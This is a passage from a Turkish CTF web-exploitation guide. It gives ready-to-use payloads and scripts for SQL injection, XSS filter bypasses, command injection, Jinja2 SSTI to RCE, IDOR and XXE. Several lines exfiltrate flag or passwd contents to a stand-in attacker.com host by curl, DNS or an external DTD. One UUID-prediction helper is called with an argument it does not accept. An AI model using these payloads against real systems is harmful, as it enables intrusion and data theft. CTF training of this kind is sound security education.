      -u "http://target.com/?page=FUZZ" \
      --hc 404 \
      --hh 1500

# Açıklama:
# --hc 404: 404 dönen requestleri gizle
# --hh 1500: 1500 karakterlik response'ları gizle (genelde error page)
```

#### Manuel vs Otomasyon: Karar Ağacı

```python
def lfi_strategy(situation):
    """LFI'da ne zaman manuel, ne zaman tool?"""
    
    if basic_payload_works():  # ../../../../etc/passwd çalıştı
        return "MANUEL devam et - Zaten içerisindesin, elle keşfet"
    
    elif filtering_detected():  # ../, ./, etc filtrelenmiş
        return "FUZZER kullan - Encoding kombinasyonları lazım"
        # Fuzzer: %2e%2e%2f, %2e%2e/, ..%2f, .../ vs deneyecek
    
    elif null_byte_needed():  # .php uzantısı engel
        return "MANUEL PHP wrapper dene - Filter wrapper kesin çalışır"
    
    else:
        return "FUZZER başlat - 2 dakika içinde her ihtimali dene"
```

### 2.1.2 SQL Injection: Veritabanı Savaşının Tüm Cepheleri

#### İşaret Fişekleri: SQL Injection'ı 5 Saniyede Tespit Et

```bash
# Test 1: Single quote testi (en temel)
?id=1'
# Eğer SQL hatası dönerse → Vulnerable!

# Test 2: Boolean testi
?id=1' AND '1'='1   # TRUE, normal sayfa
?id=1' AND '1'='2   # FALSE, farklı sayfa/hata
# Eğer sayfa davranışı değişirse → Boolean-based blind SQLi

# Test 3: Time-based testi
?id=1' AND SLEEP(5)--
# Eğer sayfa 5 saniye gecikmeli dönerse → Time-based blind SQLi

# Test 4: Error-based testi
?id=1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
# Eğer MySQL versiyonu hata mesajında göründüyse → Error-based SQLi (HIZLI!)
```

#### Derin Dalış: Error-Based SQLi - En Hızlı Yöntem

Error-based SQLi, veritabanı hatasının içinde veri sızdırma tekniğidir. CTF'te en hızlı yöntemdir çünkü:
- Tek requestte veri alırsın
- Boolean gibi karakter karakter denemen gerekmez
- Time-based gibi beklemen gerekmez

```sql
-- MySQL Error-Based Exploitation

-- Technique 1: EXTRACTVALUE() fonksiyonu
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--
-- Açıklama:
-- EXTRACTVALUE: XML parse eder, hata verirse içeriği gösterir
-- CONCAT: ~ karakteri + database adı + ~ karakteri
-- Sonuç: Hata mesajında ~ctf_db~ gibi database adı görünür

-- Technique 2: UPDATEXML() fonksiyonu
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--
-- Benzer mantık, farklı fonksiyon

-- Technique 3: Arka arkaya veri çekme
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 0x7e))--
-- GROUP_CONCAT: Tüm tabloları virgülle birleştir
-- Tek satırda tüm tablo isimleri gelir: ~users,posts,flags~

-- Technique 4: Sütun isimleri
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'), 0x7e))--

-- Technique 5: Veri çekme
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT CONCAT(username,':',password) FROM users LIMIT 0,1), 0x7e))--
-- İlk kullanıcının username:password'ünü getir

-- PostgreSQL için:
' AND 1=CAST((SELECT version()) AS int)--
-- Type casting hatası ile version'ı sızdır
```

#### UNION-Based SQLi: Hızlı Veri Çekim Protokolü

```sql
-- ADIM 1: Kolon sayısını bul (Binary Search ile hızlı)

-- Klasik yöntem (YAVAŞ):
' ORDER BY 1--  # Hata yok
' ORDER BY 2--  # Hata yok
' ORDER BY 3--  # Hata yok
... (10+ deneme)

-- Binary search yöntemi (HIZLI):
' UNION SELECT NULL,NULL,NULL,NULL,NULL--  # 5 kolon dene
# Hata → Az
' UNION SELECT NULL,NULL--  # 2 kolon dene
# Hata yok → Daha fazla
' UNION SELECT NULL,NULL,NULL,NULL--  # 4 kolon dene
# Bulundu!

-- ADIM 2: Hangi kolonlar ekrana yazdırılıyor?
' UNION SELECT 1,2,3,4--
# Ekranda 2 ve 3 görünüyor → Buradan veri çekeceğiz

-- ADIM 3: Database bilgisi
' UNION SELECT 1,database(),version(),4--

-- ADIM 4: Tablo isimleri (GROUP_CONCAT = hız)
' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--

-- ADIM 5: Sütun isimleri
' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--

-- ADIM 6: Veriyi çek
' UNION SELECT 1,GROUP_CONCAT(username,':',password),3,4 FROM users--
```

#### Boolean-Based Blind SQLi: Binary Search Algoritması

Boolean-based blind SQLi'da output görmezsin, sadece TRUE/FALSE yanıtları alırsın. Veriyi karakter karakter çıkarmak gerekir.

**Acemi yaklaşım (YAVAŞ - 26 deneme per karakter):**
```sql
' AND SUBSTRING(database(),1,1)='a'--  # FALSE
' AND SUBSTRING(database(),1,1)='b'--  # FALSE
' AND SUBSTRING(database(),1,1)='c'--  # TRUE! İlk karakter 'c'
... (ortalama 13 deneme per karakter)
```

**Champion yaklaşım (HIZLI - 7 deneme per karakter):**
```python
# Binary search ile ASCII değer aralığını daralt

def extract_database_name_fast():
    result = ""
    position = 1
    
    while True:
        low, high = 32, 126  # ASCII printable range
        
        while low <= high:
            mid = (low + high) // 2
            
            # SQL payload
            payload = f"' AND ASCII(SUBSTRING(database(),{position},1))>{mid}--"
            
            if send_request(payload):  # TRUE dönerse
                low = mid + 1
            else:
                high = mid - 1
        
        if low == 32:  # Karakter bulunamadı, string bitti
            break
        
        result += chr(low)
        position += 1
    
    return result

# Analiz:
# Database adı: "ctfdb" (5 karakter)
# Acemi yöntem: 26 × 5 = 130 request
# Binary search: 7 × 5 = 35 request
# Hız kazancı: 3.7x daha hızlı
```

#### Time-Based Blind SQLi: Son Çare

Time-based, en yavaş yöntemdir. Sadece hiçbir şey işe yaramadığında kullan.

```sql
-- MySQL
' AND IF(ASCII(SUBSTRING(database(),1,1))>97, SLEEP(5), 0)--

-- PostgreSQL
' AND CASE WHEN ASCII(SUBSTRING(database(),1,1))>97 THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL
'; IF ASCII(SUBSTRING(database(),1,1))>97 WAITFOR DELAY '00:00:05'--

-- Neden son çare?
# Her deneme 5 saniye sürüyor
# Database adı "ctfdb" için:
# Binary search ile: 7 deneme × 5 karakter = 35 request × 5 saniye = 175 saniye = 3 dakika
# Normal methodla: 26 deneme × 5 karakter = 130 request × 5 saniye = 650 saniye = 11 dakika!
```

#### SQLMap: God-Mode'u Doğru Kullanma

SQLMap güçlüdür ama yanlış kullanırsan 30 dakika beklersin. İşte optimal kullanım:

```bash
# AŞAMA 1: İstek yakalama (Burp Suite)
# POST request'i kaydet: request.txt

# AŞAMA 2: Hızlı tarama (Error ve UNION only)
sqlmap -r request.txt \
       --batch \                    # Soru sorma, otomatik devam et
       --random-agent \              # User-Agent randomize et
       --threads=10 \                # 10 paralel thread
       --technique=UE \              # Sadece UNION ve Error-based (en hızlı)
       --dbms=mysql \                # Database türünü biliyorsan belirt
       --level=1 \                   # Temel testler (hızlı)
       --risk=1 \                    # Güvenli payloadlar
       --current-db                  # Sadece DB adını al

# Süre: ~30 saniye

# AŞAMA 3: Hızlı veri çekme (DB adını biliyoruz)
sqlmap -r request.txt \
       --batch \
       --threads=10 \
       --technique=UE \
       -D ctf_db \                   # Database adı
       --tables                      # Tablo isimlerini al

# Süre: ~20 saniye

# AŞAMA 4: Flag'i direkt çek
sqlmap -r request.txt \
       --batch \
       --threads=10 \
       -D ctf_db \
       -T flags \                    # Tablo adı
       --dump                        # Tüm veriyi çek

# Toplam süre: ~1-2 dakika

# HATA: Asla yapma
sqlmap -r request.txt --level=5 --risk=3 --all
# Bu 30+ dakika sürer, binlerce payload dener
# Sadece hiçbir şey işe yaramazsa kullan
```

#### SQLMap vs Manuel: Karar Matrisi

| Durum | Kullan | Neden |
|-------|--------|-------|
| Error mesajı görülüyor | **Manuel UNION** | 2 dakikada flag vs 10 dakika sqlmap setup |
| Hiçbir output yok, Boolean | **SQLMap** | Binary search scriptini kendin yazacağına 5 dk bekle |
| WAF tespit edildi | **Manuel + Encoding** | SQLMap WAF bypass'ları generic, manuel custom daha etkili |
| Time-based zorunlu | **SQLMap veya Vazgeç** | Manuel 30 dk sürer, sqlmap 10 dk, başka soru çöz daha iyi |
| Login bypass gerekli | **Manuel** `' OR '1'='1` | Tool setup'ından hızlı |

### 2.1.3 XSS (Cross-Site Scripting): Context Savaşı

#### Vizyon: XSS Neden Zordur?

XSS'te zorluk, payloadın **nereye düştüğünde**dir. Aynı `<script>alert(1)</script>` payload'u 5 farklı yerde 5 farklı sonuç verir.

#### Context Recognition Framework: Payloadın Düştüğü Yeri Anında Tespit Et

**Test Payloadı:** `test123<script>alert(1)</script>test123`

```html
<!-- CONTEXT 1: HTML Body içinde -->
<div>Merhaba test123<script>alert(1)</script>test123</div>
<!-- Sonuç: Script çalışır! VULNERABLE -->

<!-- CONTEXT 2: HTML Attribute içinde -->
<input value="test123<script>alert(1)</script>test123">
<!-- Sonuç: Script çalışmaz (attribute içinde kaldı) -->
<!-- Çözüm: Attribute'dan çık: "><script>alert(1)</script> -->

<!-- CONTEXT 3: JavaScript içinde (string) -->
<script>
var name = 'test123<script>alert(1)</script>test123';
</script>
<!-- Sonuç: Syntax hatası, çalışmaz -->
<!-- Çözüm: String'den çık: '; alert(1); // -->

<!-- CONTEXT 4: HTML Comment içinde -->
<!-- Kullanıcı input: test123<script>alert(1)</script>test123 -->
<!-- Sonuç: Comment içinde, çalışmaz -->
<!-- Çözüm: Comment'ten çık: --><script>alert(1)</script><!-- -->

<!-- CONTEXT 5: URL içinde (href) -->
<a href="http://example.com?q=test123<script>alert(1)</script>test123">
<!-- Sonuç: URL encode olur, çalışmaz -->
<!-- Çözüm: javascript: protocol kullan -->
<a href="javascript:alert(1)">
```

#### 15-Saniyelik XSS Tespit Algoritması

```bash
# ADIM 1: Test inputunu gir
test123<xss>test123

# ADIM 2: View Source (Ctrl+U)
# "test123" için sayfa içinde ara

# Analiz:
# Eğer görüyorsan: test123&lt;xss&gt;test123
#   → HTML encoding var
#   → Deneyecek: Attribute-based, event handler-based

# Eğer görüyorsan: test123<xss>test123 (olduğu gibi)
#   → Encoding yok!
#   → Deneyecek: <script>alert(1)</script>

# Eğer görüyorsan: test123test123 (tag silindi)
#   → Tag stripping var
#   → Deneyecek: <img>, <svg>, <iframe> gibi alternatif taglar

# Eğer görüyorsan: test123\'<xss>\'test123
#   → Backslash escaping var
#   → Deneyecek: Encoding bypass
```

#### Gelişmiş XSS Bypass Teknikleri: Filtreleri Atlatma Sanatı

```html
<!-- BYPASS 1: Case Variation -->
<ScRiPt>alert(1)</ScRiPt>
<sCrIpT>alert(1)</sCrIpT>

<!-- BYPASS 2: Alternatif Event Handler'lar -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror="alert(1)">
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

<!-- BYPASS 3: JavaScript Protocol -->
<a href="javascript:alert(1)">Click me</a>
<iframe src="javascript:alert(1)">

<!-- BYPASS 4: Data Protocol -->
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:text/html,<script>alert(1)</script>">

<!-- BYPASS 5: Parantez olmadan (filter ( ve ) karakterlerini engelliyorsa) -->
<script>onerror=alert;throw 1</script>
<script>throw onerror=alert,1</script>
<img src=x onerror="alert`1`">

<!-- BYPASS 6: Tırnak olmadan -->
<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>
<!-- Bu: alert(1) -->

<!-- BYPASS 7: Template Strings (Modern browsers) -->
<script>alert`1`</script>

<!-- BYPASS 8: Comment Breaking -->
<script><!--</script><script>alert(1)//--></script>

<!-- BYPASS 9: HTML Entity Encoding -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
<!-- YWxlcnQoMSk= = base64("alert(1)") -->

<!-- BYPASS 10: Unicode Encoding -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
<!-- \u0061 = 'a' -->

<!-- BYPASS 11: Null Byte -->
<script>alert(1)%00</script>

<!-- BYPASS 12: Multiple Encoding -->
%253Cscript%253Ealert(1)%253C/script%253E
<!-- Double URL encoding -->

<!-- BYPASS 13: Poylglot XSS (Tüm contextlerde çalışır) -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

#### DOM XSS: İstemci Tarafı Zafiyet

```javascript
// Vulnerable kod:
var user = location.hash.substring(1);  // URL'den hash al
document.write(user);  // DOM'a yaz

// Exploit:
http://target.com/#<script>alert(1)</script>

// Başka bir örnek:
var search = new URLSearchParams(location.search).get('q');
document.getElementById('result').innerHTML = search;

// Exploit:
http://target.com/?q=<img src=x onerror=alert(1)>

// DOM XSS Tespit İpuçları:
# JavaScript'te şu fonksiyonlar varsa tehlikeli:
# - document.write()
# - innerHTML
# - outerHTML
# - document.location
# - eval()

# Kaynak (source) olarak bunlar kullanılıyorsa dikkat:
# - location.hash
# - location.search
# - document.URL
# - document.referrer
# - window.name
```

#### XSS Polyglot: Tek Payload Tüm Contextler

```javascript
// Evrensel XSS payload (birçok contextte çalışır)
'"><script>alert(1)</script>

// Daha kapsamlı:
'"><img src=x onerror=alert(1)>

// En kapsamlı (polyglot):
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

// Neden polyglot kullanılır?
# 5 farklı context test etmek yerine, 1 payload gönder
# 5 × 30 saniye = 2.5 dakika
# Polyglot ile: 30 saniye
# Eğer çalışırsa → kazandın
# Eğer çalışmazsa → hangi filtrelerin olduğunu öğrendin
```

### 2.1.4 Command Injection: İşletim Sistemi Katmanında Saldırı

#### İşaret Fişekleri: Kod İçinde Şunları Gördüğünde Alarm Çal

```php
// PHP
system($user_input);
exec($command);
shell_exec($data);
passthru($input);
popen($cmd, 'r');
proc_open($command);
`$command`;  // Backticks

// Python
os.system(user_input)
subprocess.call(command)
subprocess.Popen(cmd, shell=True)
eval(code)  // Ayrıca Python code injection

// Node.js
child_process.exec(command)
child_process.spawn(cmd, {shell: true})
eval(code)

// Java
Runtime.getRuntime().exec(command)
ProcessBuilder

// Ruby
system(command)
exec(command)
`command`  // Backticks
%x{command}
```

#### Injection Metacharacter Merdiveni: Hangisini Ne Zaman?

```bash
# Level 1: Command Separators (En temel)
; whoami        # Komut ayırıcı (UNIX/Windows)
| whoami        # Pipe (UNIX/Windows)
|| whoami       # OR operatörü (başarısız komut sonrası çalış)
& whoami        # Background execution (UNIX/Windows)
&& whoami       # AND operatörü (başarılı komut sonrası çalış)

# Level 2: Subshells
`whoami`        # Backticks (UNIX)
$(whoami)       # Command substitution (UNIX)

# Level 3: Newline injection
%0a whoami      # URL encoded newline (UNIX)
%0d%0a whoami   # CRLF (Windows)

# Level 4: Inline execution
ping -c 1 127.0.0.1 | whoami

# DENEME SIRASI (hız için):
# 1. ; whoami     (en basit, en hızlı test)
# 2. && whoami    (en yaygın başarı)
# 3. | whoami     (pipe genelde açık)
# 4. `whoami`     (backtick eski sistemlerde)
# 5. $(whoami)    (modern shell)
```

#### Blind Command Injection: Çıktı Görmüyorsan

Çoğu CTF challenge'ında komut çalıştırırsın ama output görmezsin. O zaman:

**Method 1: DNS Exfiltration (EN HIZLI)**
```bash
# Senin kontrolündeki bir DNS sunucun olmalı
# Ücretsiz: Burp Collaborator, interact.sh, dnslog.cn

; nslookup $(whoami).burpcollaborator.net ;
; dig $(cat flag.txt | base64).attacker.com ;

# Avantaj: Output direkt sana geliyor
# Dezavantaj: DNS sunucuya ihtiyaç var
```

**Method 2: HTTP Exfiltration**
```bash
; curl http://attacker.com/$(cat flag.txt | base64) ;
; wget http://attacker.com/log?data=$(cat flag.txt) ;

# Senin sunucunda HTTP server çalışıyor:
python3 -m http.server 80

# Sunucu loglarına bakıyorsun:
# 192.168.1.100 GET /ZmxhZ3t0ZXN0fQ== → base64 decode → flag{test}
```

**Method 3: Web Root'a Yazdırma**
```bash
; cat flag.txt > /var/www/html/output.txt ;
; cat flag.txt > /var/www/html/robots.txt ;

# Sonra tarayıcıdan:
http://target.com/output.txt
```

**Method 4: Time-Based Detection (SON ÇARE)**
```bash
# Sadece açığın varlığını test etmek için
; sleep 5 ;
; timeout 5 ;  # Windows
; ping -c 10 127.0.0.1 ;  # 10 saniye delay

# Veri çekmek için (character-by-character):
; if [ $(cat flag.txt | cut -c 1) = 'f' ]; then sleep 5; fi ;
# İlk karakter 'f' mi? Evet → 5 saniye bekle
# Sonra her karakter için tekrar et (ÇOK YAVAŞ!)
```

**Method 5: Error-Based Output**
```bash
# Bazı sistemler error mesajlarını gösterir
; cat flag.txt 1>&2 ;  # stdout'u stderr'e yönlendir

# Ya da
; cat nonexistent$(cat flag.txt).txt ;
# Hata: "nonexistentflag{...}.txt: No such file"
# Flag hata mesajında görünür!
```

#### Filter Bypass: Engelleri Aşma Sanatı

```bash
# BYPASS 1: Boşluk Filtrelemesi
# Boşluk yerine:
cat${IFS}flag.txt           # Internal Field Separator
cat$IFS$9flag.txt           # $9 boş variable
cat<flag.txt                # Input redirection
{cat,flag.txt}              # Brace expansion
cat$(<flag.txt)             # Command substitution
cat</home/ctf/flag.txt      # < ile dosya okuma

# BYPASS 2: Slash (/) Filtrelemesi
# / yerine:
cat ${HOME:0:1}etc${HOME:0:1}passwd     # ${HOME:0:1} = "/"
cat $(echo . | tr '.' '/')etc$(echo . | tr '.' '/')passwd

# BYPASS 3: Komut Adı Filtrelemesi (blacklist bypass)
# "cat" engellenmiş:
c''at flag.txt              # Boş string
c\at flag.txt               # Backslash escape
c$()at flag.txt             # Boş command substitution
tac flag.txt                # cat'in tersi (satırları ters sıralar)
more flag.txt
less flag.txt
head flag.txt
tail flag.txt
nl flag.txt                 # Satır numaraları ile gösterir
grep . flag.txt             # Her şeyi grep'le
awk '{print}' flag.txt
sed '' flag.txt
while read line; do echo $line; done < flag.txt

# BYPASS 4: Wildcard Kullanımı
cat fl*.txt
cat flag.???
cat /???/???/pass??         # /etc/xxx/passwd gibi

# BYPASS 5: Variable Expansion
CMD=cat
$CMD flag.txt

FLAG_FILE=flag.txt
cat $FLAG_FILE

# BYPASS 6: Base64 Encoding (Ultimate bypass)
echo Y2F0IGZsYWcudHh0 | base64 -d | bash
# Y2F0IGZsYWcudHh0 = "cat flag.txt"

# BYPASS 7: Hex Encoding
echo -e "\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74" | bash
# \x63 = 'c', \x61 = 'a', \x74 = 't', ...

# BYPASS 8: Octal Encoding
$(printf "\143\141\164\40\146\154\141\147\56\164\170\164")
# \143 = 'c' (octal)

# BYPASS 9: Quote Manipulation
c'a't f'l'a'g'.t'x't
c"a"t f"l"a"g".t"x"t

# BYPASS 10: Globbing
/???/??t flag.txt           # /bin/cat bulabilir
```

#### God-Mode Command Injection Test Scripti

```python
#!/usr/bin/env python3
import requests
import urllib.parse

target_url = "http://target.com/ping.php?ip="
payloads = [
    "; whoami",
    "&& whoami",
    "| whoami",
    "`whoami`",
    "$(whoami)",
    "%0a whoami",
    "; cat /etc/passwd",
    "; curl http://attacker.com/$(cat flag.txt)",
]

for payload in payloads:
    encoded = urllib.parse.quote(payload)
    url = target_url + "127.0.0.1" + encoded
    
    try:
        response = requests.get(url, timeout=5)
        
        # Indicators of successful injection:
        if any(keyword in response.text for keyword in ['root:', 'www-data', 'uid=', 'flag{']):
            print(f"[+] VULNERABLE! Payload: {payload}")
            print(f"    Response snippet: {response.text[:200]}")
        
        # Time-based detection:
        if payload == "; sleep 5" and response.elapsed.total_seconds() > 5:
            print(f"[+] TIME-BASED INJECTION DETECTED!")
    
    except requests.Timeout:
        print(f"[+] TIMEOUT (Possible time-based injection)")
    except Exception as e:
        print(f"[-] Error with payload {payload}: {e}")
```

### 2.1.5 SSTI (Server-Side Template Injection): Template Engine Savaşı

#### Vizyon: SSTI Nedir ve Neden Kritik?

Template engine'ler (Jinja2, Twig, FreeMarker, vs.) HTML sayfalarına dinamik içerik eklemek için kullanılır. Ancak eğer kullanıcı input'u direkt template'e gidiyorsa → RCE!

```python
# VULNERABLE Flask uygulaması:
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name', 'Guest')
    template = f"<h1>Hello {name}!</h1>"  # Kullanıcı inputu direkt template'de!
    return render_template_string(template)  # TEHLİKE!

# Normal kullanım:
# /?name=Ali → "Hello Ali!"

# SSTI saldırısı:
# /?name={{7*7}} → "Hello 49!"
# Template engine hesaplama yaptı!
```

#### 10-Saniyelik SSTI Tespit Testi

```bash
# ADIM 1: Matematik ifadesi gönder
{{7*7}}    # Jinja2, Twig
${7*7}     # FreeMarker, Velocity, Mako
<%= 7*7 %> # ERB (Ruby)
#{ 7*7 }   # Thymeleaf

# ADIM 2: Response'u kontrol et
# Eğer "49" dönerse → SSTI VAR!
# Eğer "{{7*7}}" dönerse → Template engine yok veya encode ediliyor

# ADIM 3: Engine tanımlama
{{7*'7'}}   # Jinja2 → "7777777" (string repetition)
${7*'7'}    # FreeMarker → Hata veya farklı sonuç
```

#### Template Engine İmza Tablosu

| Test Payload | Jinja2 | Twig | FreeMarker | Velocity | ERB | Smarty |
|--------------|--------|------|------------|----------|-----|--------|
| `{{7*7}}` | 49 | 49 | Hata | Hata | Hata | Hata |
| `${7*7}` | ${7*7} | ${7*7} | 49 | 49 | Hata | Hata |
| `<%= 7*7 %>` | &lt;%= 7*7 %&gt; | &lt;%= 7*7 %&gt; | Hata | Hata | 49 | Hata |
| `{{7*'7'}}` | 7777777 | 7777777 | Hata | Hata | Hata | Hata |
| `{7*7}` | {7*7} | {7*7} | {7*7} | {7*7} | {7*7} | 49 |

#### Jinja2 SSTI: Sıfırdan RCE'ye Yükselme

Jinja2, Python Flask framework'ünde kullanılır. CTF'lerde en çok karşılaşılan SSTI türü.

**Escalation Ladder (Yükselme Merdiveni):**

```python
# LEVEL 1: Temel bilgi toplama
{{ config }}                # Flask config'i göster (DEBUG, SECRET_KEY, vs.)
{{ self }}                  # Mevcut context
{{ request }}               # HTTP request objesi
{{ request.environ }}       # Environment variables (FLAG olabilir!)

# LEVEL 2: Python object model'i keşfet
{{ ''.__class__ }}                    # <class 'str'>
{{ ''.__class__.__mro__ }}           # Method resolution order (sınıf hiyerarşisi)
{{ ''.__class__.__mro__[1] }}        # <class 'object'> (root class)

# LEVEL 3: Tüm Python classlarına eriş
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Bu, Python'daki TÜM classları listeler (200+ class)

# LEVEL 4: İşe yarar classlar bul
# Aradığımız classlar:
# - subprocess.Popen (komut çalıştırma)
# - os._wrap_close (file operations)
# - warnings.catch_warnings (__builtins__ erişimi)

# Hangi index'te olduğunu bul:
{% for i in range(500) %}
  {{ i }}: {{ ''.__class__.__mro__[1].__subclasses__()[i] }}
{% endfor %}

# Diyelim subprocess.Popen 396. index'te:

# LEVEL 5: RCE!
{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat flag.txt', shell=True, stdout=-1).communicate()[0].strip() }}

# Açıklama:
# __subclasses__()[396] → subprocess.Popen class'ı
# ('cat flag.txt', shell=True, stdout=-1) → Komutu çalıştır
# .communicate()[0] → Output'u al
# .strip() → Whitespace temizle
```

**Alternatif RCE Yöntemleri:**

```python
# Method 1: __builtins__ üzerinden
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['__builtins__']['eval']('__import__("os").system("cat flag.txt")') }}

# Method 2: lipsum.__globals__ (Flask specific)
{{ lipsum.__globals__['os'].popen('cat flag.txt').read() }}

# Method 3: cycler.__init__.__globals__
{{ cycler.__init__.__globals__['os'].popen('cat flag.txt').read() }}

# Method 4: url_for.__globals__
{{ url_for.__globals__['current_app'].config['SECRET_KEY'] }}
{{ url_for.__globals__['sys'].modules['os'].popen('cat flag.txt').read() }}

# Method 5: request.application.__globals__
{{ request.application.__globals__['__builtins__']['__import__']('os').popen('cat flag.txt').read() }}
```

**SSTI Blacklist Bypass:**

```python
# Eğer "config", "class", "mro" gibi kelimeler filtreliyse:

# BYPASS 1: String concatenation
{{ ''['__cla'+'ss__'] }}
{{ ''['__cl' + 'ass__'] }}

# BYPASS 2: Attribute access
{{ ''['__class__'] }}   # Dot notation yerine bracket notation
{{ ''|attr('__class__') }}  # Jinja2 filter

# BYPASS 3: Request parameters
# URL: /?param=__class__
{{ ''[request.args.param] }}

# BYPASS 4: Base64 encoding
{{ ''[request.args.x|b64decode] }}
# URL: /?x=X19jbGFzc19f  (base64 of __class__)

# BYPASS 5: Unicode escaping
{{ ''\u005f\u005fclass\u005f\u005f }}
# \u005f = '_'
```

### 2.1.6 IDOR (Insecure Direct Object Reference): Yetkilendirme Hatası

#### Vizyon: En Basit Ama En Etkili Zafiyet

IDOR, bir kullanıcının başkasının verisine erişmesi demektir. Örnek:

```
Normal istek:
GET /api/user/profile?id=123

Kendi profilin: id=123
Başkasınınki: id=124 dene → Erişebildin mi? IDOR!
```

#### IDOR Avcısı Checklist

```bash
# Test edilecek parametreler (öncelik sırasıyla):

1. ?id=123              → ?id=124, 125, 1, 2, 100, 999
2. ?user_id=abc         → ?user_id=admin, root, test, 1
3. ?file=myfile.pdf     → ?file=../../../etc/passwd
4. ?doc_id=UUID         → ?doc_id=00000000-0000-0000-0000-000000000001
5. Cookie: session=123  → Cookie: session=124
6. JWT: {"user_id":123} → JWT: {"user_id":1} (admin)

# İpucu: Sequential ID'ler (1, 2, 3, ...) en kolay IDOR hedefleridir
```

#### IDOR Otomasyonu: Burp Intruder

```bash
# ADIM 1: İsteği Burp'ta yakala
GET /api/user/profile?id=123 HTTP/1.1

# ADIM 2: Intruder'a gönder (Ctrl+I)

# ADIM 3: Payload pozisyonunu işaretle
GET /api/user/profile?id=§123§ HTTP/1.1

# ADIM 4: Payload tipi: Numbers
# From: 1
# To: 1000
# Step: 1

# ADIM 5: Attack!
# Response'ları karşılaştır:
# - 200 OK ve farklı data → IDOR var!
# - 403 Forbidden → Yetkilendirme çalışıyor
# - 404 Not Found → O ID yok

# Zaman: 1000 request × 100ms = 100 saniye = ~2 dakika
```

#### İleri Seviye IDOR: UUID Tahmin Etme

```python
# UUID v1: Timestamp + MAC address
# Tahmin edilebilir!

import uuid
import datetime

def predict_uuid_v1(known_uuid, target_timestamp):
    """Bilinen bir UUID'den yola çıkarak başkasının UUID'sini tahmin et"""
    
    # UUID v1 structure:
    # time_low-time_mid-time_hi-clock_seq-node
    # Example: 123e4567-e89b-12d3-a456-426614174000
    
    # Parse known UUID
    known = uuid.UUID(known_uuid)
    
    # UUID v1 timestamp: 100-nanosecond intervals since 1582-10-15
    known_timestamp = known.time
    
    # Target timestamp (örn: 1 saat önce)
    time_diff = 3600 * 10**7  # 1 saat = 3600 saniye = 3600*10^7 nanosaniye (100-nanosecond intervals)
    target_time = known_timestamp - time_diff
    
    # Tahmin edilen UUID
    # (Node ve clock_seq aynı kalır genelde)
    predicted = uuid.UUID(fields=(
        target_time & 0xFFFFFFFF,           # time_low
        (target_time >> 32) & 0xFFFF,       # time_mid
        (target_time >> 48) & 0x0FFF | 0x1000,  # time_hi_version
        known.clock_seq_hi_variant,
        known.clock_seq_low,
        known.node
    ))
    
    return str(predicted)

# Kullanım:
# Kendi UUID'in: 123e4567-e89b-12d3-a456-426614174000
# Adminin hesabı 2 saat önce oluşturuldu
admin_uuid = predict_uuid_v1("123e4567-e89b-12d3-a456-426614174000", hours_ago=2)
# admin_uuid'yi dene: /api/user/profile?id={admin_uuid}
```

### 2.1.7 XXE (XML External Entity): XML Parser Saldırısı

#### Temel Konsept

```xml
<!-- Normal XML -->
<?xml version="1.0"?>
<user>
    <name>Ali</name>
    <email>ali@example.com</email>
</user>

<!-- XXE Saldırısı -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <name>&xxe;</name>
    <email>ali@example.com</email>
</user>

<!-- Sonuç: <name> tag'i içinde /etc/passwd içeriği gelir -->
```

#### XXE Exploitation Ladder

```xml
<!-- LEVEL 1: Dosya okuma -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- LEVEL 2: Internal network tarama (SSRF) -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:80">
]>
<root>&xxe;</root>

<!-- LEVEL 3: PHP wrapper ile base64 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>

<!-- LEVEL 4: Parameter entity ile blind XXE -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>

<!-- attacker.com/evil.dtd dosyasında: -->
<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%xxe;'>">
